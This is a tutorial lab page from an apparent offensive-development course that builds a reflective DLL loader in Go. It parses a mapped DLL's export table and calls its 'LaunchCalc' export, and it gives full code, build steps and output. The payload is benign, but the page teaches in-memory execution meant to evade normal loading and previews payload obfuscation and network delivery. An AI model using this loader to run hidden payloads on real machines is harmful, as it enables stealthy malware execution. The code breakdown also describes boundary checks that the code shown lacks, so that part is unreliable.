---
showTableOfContents: true
title: "Call Exported Function (Lab 5.2)"
type: "page"
---

## Goal
We'll now modify our application from Lab 5.1 to locate the address of the exported `LaunchCalc` function within the mapped `calc_dll.dll` by parsing the PE Export Directory. Once found, we can call this function using `syscall.SyscallN`. This is the final step to trigger the DLL's payload, which should launch the Windows Calculator.


## Code
With your final solution from Lab 5.1 as the foundation, make the following changes


```go
    type IMAGE_EXPORT_DIRECTORY struct { //nolint:revive // Windows struct
        Characteristics       uint32
        TimeDateStamp         uint32
        MajorVersion          uint16
        MinorVersion          uint16
        Name                  uint32 // RVA of the DLL name string
        Base                  uint32 // Starting ordinal number
        NumberOfFunctions     uint32 // Total number of exported functions (Size of EAT)
        NumberOfNames         uint32 // Number of functions exported by name (Size of ENPT & EOT)
        AddressOfFunctions    uint32 // RVA of the Export Address Table (EAT)
        AddressOfNames        uint32 // RVA of the Export Name Pointer Table (ENPT)
        AddressOfNameOrdinals uint32 // RVA of the Export Ordinal Table (EOT)
    }
```


We also want to add the following constant.

```go
    const (
        IMAGE_DIRECTORY_ENTRY_EXPORT = 0 // Export Directory index in DataDirectory
        // ... other constants ...
    )
```


We'll now add the new logic to call our exported function. Insert the following  _after_ the `DllMain` call logic (from Lab 5.1), but _before_ the final "Self-Check" or exit messages.

```go
        // --- Step 8: Find and Call Exported Function ---
        targetFunctionName := "LaunchCalc" // The function we want to call
        fmt.Printf("[+] Locating exported function: %s\n", targetFunctionName)
    
        var targetFuncAddr uintptr = 0 // Initialize to 0 (not found)
    
        // Find the Export Directory entry
        exportDirEntry := optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
        exportDirRVA := exportDirEntry.VirtualAddress
        // exportDirSize := exportDirEntry.Size // Size might be useful for boundary checks
    
        if exportDirRVA == 0 {
            log.Println("[-] DLL has no Export Directory. Cannot find exported function.")
            // Depending on requirements, might be fatal or just skip this step
        } else {
            fmt.Printf("[+] Export Directory found at RVA 0x%X\n", exportDirRVA)
            exportDirBase := allocBase + uintptr(exportDirRVA) // VA of IMAGE_EXPORT_DIRECTORY
            exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(exportDirBase))
    
            // Calculate the absolute addresses of the EAT, ENPT, and EOT
            eatBase := allocBase + uintptr(exportDir.AddressOfFunctions)    // Export Address Table VA
            enptBase := allocBase + uintptr(exportDir.AddressOfNames)       // Export Name Pointer Table VA
            eotBase := allocBase + uintptr(exportDir.AddressOfNameOrdinals) // Export Ordinal Table VA
    
            fmt.Printf("    NumberOfNames: %d, NumberOfFunctions: %d\n", exportDir.NumberOfNames, exportDir.NumberOfFunctions)
            fmt.Println("[+] Searching Export Name Pointer Table (ENPT)...")
    
            // Iterate through the names in ENPT
            for i := uint32(0); i < exportDir.NumberOfNames; i++ {
                // Get RVA of the function name string from ENPT
                nameRVA := *(*uint32)(unsafe.Pointer(enptBase + uintptr(i*4))) // ENPT stores RVAs (4 bytes)
                // Get VA of the function name string
                nameVA := allocBase + uintptr(nameRVA)
                // Read the function name string
                funcName := windows.BytePtrToString((*byte)(unsafe.Pointer(nameVA)))
    
                // Uncomment for verbose debugging:
                // fmt.Printf("    [%d] Checking Name: '%s'\n", i, funcName)
    
                // Check if this is the function name we are looking for
                if funcName == targetFunctionName {
                    fmt.Printf("    [+] Found target function name '%s' at index %d.\n", targetFunctionName, i)
                    // Get the ordinal for this name from EOT using the same index i
                    // EOT stores WORDs (2 bytes)
                    ordinal := *(*uint16)(unsafe.Pointer(eotBase + uintptr(i*2)))
                    fmt.Printf("        Ordinal: %d\n", ordinal)
    
                    // Use the ordinal as an index into the EAT to get the function's RVA
                    // EAT stores RVAs (4 bytes)
                    // Note: The ordinal is the direct index into the EAT array
                    funcRVA := *(*uint32)(unsafe.Pointer(eatBase + uintptr(ordinal*4)))
                    fmt.Printf("        Function RVA: 0x%X\n", funcRVA)
    
                    // Calculate the final absolute Virtual Address of the target function
                    targetFuncAddr = allocBase + uintptr(funcRVA)
                    fmt.Printf("[+] Target function '%s' located at VA: 0x%X\n", targetFunctionName, targetFuncAddr)
                    break // Exit loop once found
                }
            } // End name search loop
    
            // Check if we found the function
            if targetFuncAddr == 0 {
                log.Printf("[-] Target function '%s' not found in Export Directory.\n", targetFunctionName)
                // Decide if this is fatal based on application logic
            } else {
                // --- Call the Exported Function ---
                fmt.Printf("[+] Calling target function '%s' at 0x%X...\n", targetFunctionName, targetFuncAddr)
    
                // LaunchCalc signature is: BOOL LaunchCalc() - takes 0 arguments
                ret, _, callErr := syscall.SyscallN(targetFuncAddr, 0, 0, 0, 0)
    
                if callErr != 0 {
                     log.Printf("    [-] Syscall error during '%s' call: %v\n", targetFunctionName, callErr)
                     // Consider if this is fatal
                } else {
                    // Check the boolean return value from LaunchCalc
                    if ret != 0 { // Non-zero means TRUE
                        fmt.Printf("    [+] Exported function '%s' executed successfully (returned TRUE).\n", targetFunctionName)
                        fmt.Println("        ==> Check if Calculator launched! <==")
                    } else { // Zero means FALSE
                        fmt.Printf("    [-] Exported function '%s' reported failure (returned FALSE).\n", targetFunctionName)
                    }
                }
            }
        } // End else (Export Directory found)
    
    
        // --- Existing Final Messages / Self-Check ---
    ```


Finally replace the existing Self-Check section (now Step 9) to focus on our loader as a whole instead of any specific step. 
```go
	// --- Step 9: Self-Check (Basic) --- (Renumbered)
	fmt.Println("\n[+] ===== FINAL LOADER STATUS =====") // Separator for final checks
	fmt.Println("[+] Manual mapping & execution process complete.")
	fmt.Println("[+] Self-Check Suggestion:")
	fmt.Printf("    - Verify console output shows successful completion of all stages (Parse, Alloc, Map, Reloc Check, IAT, DllMain, Export Call).\n") 
	fmt.Printf("    - PRIMARY CHECK: Verify that '%s' was launched successfully!\n", "calc.exe") 
	fmt.Printf("    - (Optional) Use Process Hacker/Explorer to observe the loader process briefly running and launching the payload.\n") 

	fmt.Println("\n[+] Press Enter to free memory and exit.")
	fmt.Scanln()

	fmt.Println("[+] Mapper finished.")
}
```



## Code Breakdown

Note this explains only the logic added or significantly changed compared to the code from Lab 5.1 .

### New Struct + Constant

* **`IMAGE_EXPORT_DIRECTORY` struct:** Added to define the layout of the PE Export Directory. Contains counts (`NumberOfFunctions`, `NumberOfNames`) and RVAs to the key tables (`AddressOfFunctions`, `AddressOfNames`, `AddressOfNameOrdinals`).
* **`IMAGE_DIRECTORY_ENTRY_EXPORT` constant (0):** Added index for the Export Directory in the Data Directory.


### Find and Call Exported Function (Step 8)
- **Define Target:** Sets `targetFunctionName` to `"LaunchCalc"`. Initializes `targetFuncAddr` to 0.
- **Locate Export Directory:** Gets the `exportDirEntry` from `optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]`. Skips if no export directory exists.
-  **Parse Export Directory:** Calculates the VA (`exportDirBase`) of the `IMAGE_EXPORT_DIRECTORY` structure within the mapped DLL memory (`allocBase`) and reads the structure using an `unsafe.Pointer` cast.
- **Locate Export Tables:** Calculates the absolute VAs (`eatBase`, `enptBase`, `eotBase`) of the Export Address Table, Export Name Pointer Table, and Export Ordinal Table by adding their respective RVAs (from the `exportDir` struct) to `allocBase`. Adds debug prints for these addresses and counts.
- **Search Names (ENPT Loop):** Iterates from `i = 0` to `exportDir.NumberOfNames - 1`.
    * Calculates the address of the i-th name RVA pointer within ENPT (`enptBase + uintptr(i*4)`). Reads the `nameRVA` (a `uint32`).
    * Calculates the VA of the name string (`nameVA = allocBase + uintptr(nameRVA)`).
    * Reads the null-terminated string at `nameVA` using `windows.BytePtrToString`.
    * Compares the read `funcName` with `targetFunctionName`.
* **Process Match:** If the name matches:
    * Calculates the address of the i-th ordinal in the EOT (`eotBase + uintptr(i*2)`). Reads the 16-bit `ordinal`.
    * Uses the `ordinal` as an index into the EAT. Calculates the address of the function's RVA pointer in the EAT (`eatBase + uintptr(ordinal*4)`). Reads the `funcRVA` (a `uint32`).
    * Calculates the final absolute VA of the target function: `targetFuncAddr = allocBase + uintptr(funcRVA)`.
    * Includes several boundary checks (for reading name RVA, name string, ordinal, function RVA, and the final calculated function VA) to ensure pointers/indices are within the allocated memory bounds before dereferencing or declaring success.
    * Breaks the loop once the function is found (or determined invalid).
- **Check if Found:** After the loop, checks if `targetFuncAddr` is still 0. If so, logs an error that the function wasn't found.
- **Call Exported Function:** If `targetFuncAddr` is valid (non-zero):
    * Logs the attempt to call the function.
    * Uses `syscall.SyscallN(targetFuncAddr, 0, 0, 0, 0)` to call the function (since `LaunchCalc` takes no arguments).
    * Checks `callErr` for syscall errors.
    * Checks the `ret` value (BOOL return from `LaunchCalc`).



## Instructions

- Compile the new application.

```shell  
GOOS=windows GOARCH=amd64 go build  
```  

- Then copy it over to target system and invoke from command-line, providing as argument the dll you’d like to analyze, for example:

```bash  
".\reflect_final.exe .\calc_dll.dll"  
```


## Results

```shell
PS C:\Users\vuilhond\Desktop> .\reflect_final.exe .\calc_dll.dll
[+] Starting Manual DLL Mapper (with IAT Resolution)...
[+] Reading file: .\calc_dll.dll
[+] Parsed PE Headers successfully.
[+] Target ImageBase: 0x26A5B0000
[+] Target SizeOfImage: 0x22000 (139264 bytes)
[+] Allocating 0x22000 bytes of memory for DLL...
[+] DLL memory allocated successfully at actual base address: 0x26A5B0000
[+] Copying PE headers (1536 bytes) to allocated memory...
[+] Copied 1536 bytes of headers successfully.
[+] Copying sections...
[+] All sections copied.
[+] Checking if base relocations are needed...
[+] Image loaded at preferred base. No relocations needed.
[+] Processing Import Address Table (IAT)...
[+] Import Directory found at RVA 0x9000
    [->] Processing imports for: KERNEL32.dll
    [+] Finished imports for 'KERNEL32.dll'.
    [->] Processing imports for: api-ms-win-crt-environment-l1-1-0.dll
    [+] Finished imports for 'api-ms-win-crt-environment-l1-1-0.dll'.
    [->] Processing imports for: api-ms-win-crt-heap-l1-1-0.dll
    [+] Finished imports for 'api-ms-win-crt-heap-l1-1-0.dll'.
    [->] Processing imports for: api-ms-win-crt-runtime-l1-1-0.dll
    [+] Finished imports for 'api-ms-win-crt-runtime-l1-1-0.dll'.
    [->] Processing imports for: api-ms-win-crt-stdio-l1-1-0.dll
    [+] Finished imports for 'api-ms-win-crt-stdio-l1-1-0.dll'.
    [->] Processing imports for: api-ms-win-crt-string-l1-1-0.dll
    [+] Finished imports for 'api-ms-win-crt-string-l1-1-0.dll'.
    [->] Processing imports for: api-ms-win-crt-time-l1-1-0.dll
    [+] Finished imports for 'api-ms-win-crt-time-l1-1-0.dll'.
[+] Import processing complete (7 DLLs).
[+] Locating and calling DLL Entry Point (DllMain)...
[+] Entry Point found at RVA 0x1330 (VA 0x26A5B1330).
[+] Calling DllMain(0x26A5B0000, DLL_PROCESS_ATTACH, 0)...
    [+] DllMain executed successfully (returned TRUE).
[+] Locating exported function: LaunchCalc
[+] Export Directory found at RVA 0x8000
    NumberOfNames: 1, NumberOfFunctions: 1
[+] Searching Export Name Pointer Table (ENPT)...
    [+] Found target function name 'LaunchCalc' at index 0.
        Ordinal: 0
        Function RVA: 0x1491
[+] Target function 'LaunchCalc' located at VA: 0x26A5B1491
[+] Calling target function 'LaunchCalc' at 0x26A5B1491...
    [+] Exported function 'LaunchCalc' executed successfully (returned TRUE).
        ==> Check if Calculator launched! <==

[+] ===== FINAL LOADER STATUS =====
[+] Manual mapping & execution process complete.
[+] Self-Check Suggestion:
    - Verify console output shows successful completion of all stages (Parse, Alloc, Map, Reloc Check, IAT, DllMain, Export Call).
    - PRIMARY CHECK: Verify that 'calc.exe' was launched successfully!
    - (Optional) Use Process Hacker/Explorer to observe the loader process briefly running and launching the payload.

[+] Press Enter to free memory and exit.

[+] Mapper finished.
[+] Attempting to free main DLL allocation at 0x26A5B0000...
[+] Main DLL memory freed successfully.
```


In addition to our terminal output we should now also see our actual calculator appear on screen!
![calc.exe](../img/calc.png)


## Discussion
- **`(Previous Stages Completed)`** - Confirms successful PE parsing, memory allocation at preferred base (`0x26A5B0000`), header/section mapping, skipping of relocations, successful IAT resolution for 7 DLLs, and successful call to `DllMain`.
- **`Export Directory found at RVA 0x8000`** - This confirms the loader successfully located the PE Export Directory using the Data Directory entry.
- **`Found target function name 'LaunchCalc' at index 0.` ... `Target function 'LaunchCalc' located at VA: 0x26A5B1491`** - These lines show the export lookup logic worked correctly: it iterated the Export Name Pointer Table, found "LaunchCalc", used the Export Ordinal Table (ordinal 0) to index into the Export Address Table (getting RVA 0x1491), and calculated the correct final Virtual Address for the function.
- **`Calling target function 'LaunchCalc' at 0x26A5B1491...`** - Indicates the program is about to execute the resolved function address via `syscall.SyscallN`.
- **`Exported function 'LaunchCalc' executed successfully (returned TRUE).`** - This confirms the `syscall.SyscallN` call completed without system error and the `LaunchCalc` function itself returned TRUE, indicating the shellcode execution within it likely succeeded.


## Conclusion
If you've made it this far - GREAT JOB!

In these first 5 modules we have now successfully constructed a functional reflective DLL loader in Go from the ground up. We've manually replicated the core tasks of the Windows loader: parsing the PE structure, allocating memory, mapping sections, handling address relocations, resolving imports via the IAT, and finally, invoking both the optional `DllMain` entry point and a specific exported function to execute the payload – all without relying on `LoadLibrary` for the target DLL. This achieves the fundamental goal of in-memory execution.

So while functional, our current loader operates on a locally stored, unobfuscated DLL. So in our following modules we'll learn both how to properly obfuscate, and then transfer our payload across a network to ensure it stays in-memory on the target machine. We'll then bring everything together in a final project in Module 09.

I hope you are as pumped as I am!






---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "entry_lab.md" >}})
[|NEXT|]({{< ref "../module06/intro.md" >}})
